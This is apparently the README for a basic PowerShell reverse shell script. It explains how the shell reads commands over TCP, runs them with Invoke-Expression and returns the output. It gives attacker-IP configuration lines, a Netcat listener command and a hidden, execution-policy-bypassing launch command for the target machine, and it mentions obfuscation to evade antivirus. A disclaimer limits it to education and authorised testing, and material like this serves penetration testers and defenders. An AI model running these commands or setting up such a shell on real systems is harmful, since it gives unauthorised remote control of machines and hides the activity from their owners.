# Basic PowerShell Reverse Shell (Direct Stream)

This PowerShell script provides a **reverse shell** connection from a target machine back to your attacker system. It's a foundational technique in ethical hacking and penetration testing, enabling **remote command execution** on a compromised system.

---

## How It Works

This script establishes an **outbound TCP connection** from the target to your machine. Once connected, it creates an interactive shell by directly manipulating byte streams:

1.  **Reads Raw Bytes:** It reads raw bytes from the network stream, representing commands sent from your attacker machine.
2.  **Decodes & Executes:** These bytes are decoded into commands, which are then executed on the target using `Invoke-Expression` (`iex`).
3.  **Encodes & Sends Output:** The command's output (including errors) is encoded back into bytes and sent directly over the network stream to your listener.
4.  **Adds Prompt:** To make the shell experience more natural, it appends the current PowerShell path (`PS C:\Path\To\> `) to the output before sending it back.

---

## Setup & Usage

### 1. Configure the Script

Before using, you **must edit the script** to specify your attacker machine's IP address and chosen listening port:

* **`$AttackerIP`**: Your IP address (e.g., `"192.168.1.100"`)
* **`$AttackerPort`**: Your chosen listening port (e.g., `9001`)

```powershell
# --- Configuration ---
$AttackerIP = "Attacker_ip" # <== REPLACE WITH YOUR IP
$AttackerPort = 1357        # <== REPLACE WITH YOUR PORT
2. Start Your Listener (Attacker Machine)
Use Netcat (nc) to listen for the incoming connection on the port you configured:

Bash

nc -lvnp <Your_AttackerPort>
# Example: nc -lvnp 1357
3. Execute on Target (Target Machine)
Run the modified PowerShell script on the target system. The following command is commonly used to execute it silently and bypass execution policies:

PowerShell

powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File C:\Path\To\your_reverse_shell.ps1
(Replace C:\Path\To\your_reverse_shell.ps1 with the actual path to your script.)

Interaction
Once the target connects, you'll gain an interactive PowerShell prompt within your Netcat listener. You can type commands like whoami, dir, or ipconfig, and their output will be displayed directly. The added PowerShell prompt will make navigating easier.

Important Considerations
Educational Use Only: This script is provided strictly for educational purposes and authorized ethical hacking engagements. Never use it on any system without explicit, written permission from the owner. Unauthorized use is illegal and unethical.
Detection: Given its functionality, this script is highly likely to be detected by antivirus (AV) and Endpoint Detection and Response (EDR) solutions. Modern security software is designed to identify and block such activities.
Stability: This is a basic reverse shell and might not be perfectly stable in all network conditions or when processing very large command outputs. More advanced shells often incorporate robust error handling and improved communication methods.
Further Development: Advanced reverse shells may include features like encryption, support for different protocols (e.g., HTTP, HTTPS), obfuscation techniques to evade detection, and better interactive shell emulation.
